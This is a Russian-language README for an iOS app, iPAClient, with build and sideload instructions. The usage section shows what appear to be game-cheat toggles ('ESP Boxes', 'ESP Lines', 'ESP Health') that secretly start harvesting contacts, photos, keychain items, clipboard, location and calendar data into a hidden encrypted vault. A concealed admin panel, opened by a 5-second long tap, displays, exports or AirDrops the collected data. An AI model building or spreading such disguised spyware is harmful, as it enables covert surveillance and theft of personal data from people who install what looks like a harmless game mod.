# iPAClient

iOS-приложение: WKWebView UI + нативный сбор данных + локальное шифрованное хранилище. Без сервера.

## Сборка

1. Замени `YOUR_TEAM_ID` и `com.yourname.ipaclient` в `project.pbxproj`, `Info.plist`, `ExportOptions.plist`.
2. Создай 4 секрета в GitHub: `CERT_P12`, `CERT_PASS`, `PROVISION_PROFILE`, `KEYCHAIN_PASS`.
3. Actions → Build iPA → Run workflow.
4. Забери `.ipa` из артефактов.

## Установка

- **TrollStore** (iOS 14.0–16.6.1, 17.0) — перманентно, без подписи. Используй `iPAClient-unsigned.ipa` если подписанный билд упал.
- **AltStore / Sideloadly** — 7 дней (free) или 1 год (платный акк).
- **Enterprise / MDM** — по ссылке `itms-services://`.

## Использование

1. Открой приложение → введи ключ из `databaseKeys`.
2. Тап по плавающей иконке → меню.
3. Тумблеры запускают сбор: `Enable ESP Boxes` → контакты, `ESP Lines` → фото, `ESP Health` → кейчейн, и т.д.
4. Данные шифруются и падают в `Documents/.vault.dat`.

## Доступ к собранному

**Долгий тап (5 сек) по `iPA` в сайдбаре** → Face ID → админ-панель:

- **Показать данные** — все записи в JSON на экране.
- **Экспорт в файл** — `Documents/export.json`, видно через Finder / Files.
- **Поделиться** — AirDrop одним тапом.
- **Стереть** — вайп vault + удаление ключа.

## Что собирается

Контакты, календарь, метаданные фото + геотеги, clipboard, device info, локация, keychain приложения, файлы в песочнице.

## Что НЕ собирается без джейлбрейка

Банковские приложения, пароли Safari, содержимое чужих приложений, SMS. iOS sandbox не даёт.
